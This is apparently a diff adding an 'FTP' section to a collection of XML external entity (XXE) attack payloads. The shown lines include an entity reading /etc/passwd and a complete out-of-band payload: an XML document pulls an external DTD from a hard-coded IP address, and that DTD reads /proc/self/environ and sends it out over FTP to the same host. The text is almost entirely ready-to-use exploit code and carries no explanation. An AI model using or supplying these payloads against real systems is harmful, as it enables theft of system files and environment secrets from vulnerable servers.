@@ -56,3 +56,19 @@ File-not-found exception based extraction
 
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+
+--------------
+FTP
+--------------
+<?xml version="1.0" ?>
+<!DOCTYPE a [ 
+<!ENTITY % asd SYSTEM "http://46.101.180.57:4444/ext.dtd">
+       %asd;
+       %c;
+]>
+<a>&rrr;</a>
+
+
+## External dtd ##
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://46.101.180.57:2121/%d;'>">
